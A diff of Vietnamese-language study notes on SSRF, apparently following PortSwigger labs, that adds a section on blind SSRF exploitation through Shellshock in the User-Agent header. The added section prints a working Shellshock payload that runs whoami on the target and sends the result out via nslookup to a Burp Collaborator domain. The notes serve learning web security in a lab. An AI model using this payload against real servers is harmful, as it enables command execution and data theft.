@@ -12,8 +12,16 @@
 - <img width="1085" height="148" alt="image" src="https://github.com/user-attachments/assets/5e15374a-eab1-46ef-9dcf-eb9612530f8e" />
 chúng ta thấy có file flag.txt. Tiếp tục chúng ta sẽ thực hiện lệnh 2:
 - <img width="1055" height="101" alt="image" src="https://github.com/user-attachments/assets/7b8339eb-a0fb-4a62-bd3c-9e4bc50aa2d0" />
-thì sao khi thực hiện lệnh 2 ta sẽ nhận về được 1 file flag.txt 
-#### VD5: Kỹ thuật DNS Rebinding ( Kỹ thuật SSRF nâng cao)
+thì sao khi thực hiện lệnh 2 ta sẽ nhận về được 1 file flag.txt
+### VD5: Chèn Shellshock (https://portswigger.net/web-security/ssrf/blind/lab-shellshock-exploitation)
+- Lổ hỏng ssrf còn có thể tấn công qua Header User-Agent, sử dụng thêm tính năng Collaborator của burpsuite. tôi chèn Shellshock payload như sau:
+```bash
+() { :; }; /usr/bin/nslookup $(whoami).devxx7cbhs5dtqyo92g7gsba51brzg.burpcollaborator.net
+```
+Shellshock hiểu đơn giản là dạng lỗ hổng liên quan đến các Bash version (đến Version 4.3 của GNU Bash) có thể bị khai thác để thực thi các command vượt thẩm quyền cho phép. Như cái payload ở trên thì ý tưởng là múc cái kết quả command whoami rồi chạy nslookup với cái subdomain tương ứng;
+<img width="1930" height="606" alt="image" src="https://github.com/user-attachments/assets/4a6b7709-6f7c-459e-a2db-ca226f357bbd" />
+thế là tôi là lấy được username, còn có thể sử dụng để lấy những thứ khác.
+#### VD6: Kỹ thuật DNS Rebinding ( Kỹ thuật SSRF nâng cao)
 - Ta sẽ nhìn vào đoạn code sao đây
 ```python
 from urllib.parse import urlparse
